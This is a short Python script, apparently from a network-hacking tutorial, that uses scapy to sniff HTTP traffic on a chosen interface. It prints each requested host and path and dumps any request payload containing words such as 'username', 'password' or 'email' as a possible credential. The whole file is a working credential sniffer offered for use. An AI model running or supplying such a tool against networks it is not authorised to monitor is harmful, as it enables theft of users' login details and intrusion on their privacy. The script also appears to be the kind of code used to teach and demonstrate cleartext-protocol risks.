#!/usr/bin/env python
import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser(description="Packet sniffer")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Specify interface on which to sniff packets")
    arguments, _ = parser.parse_known_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode() if packet[http.HTTPRequest].Host else b''
        path = packet[http.HTTPRequest].Path.decode() if packet[http.HTTPRequest].Path else b''
        print("[+] HTTP Request >> " + host + path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
                    break

iface = get_interface()
sniff(iface)
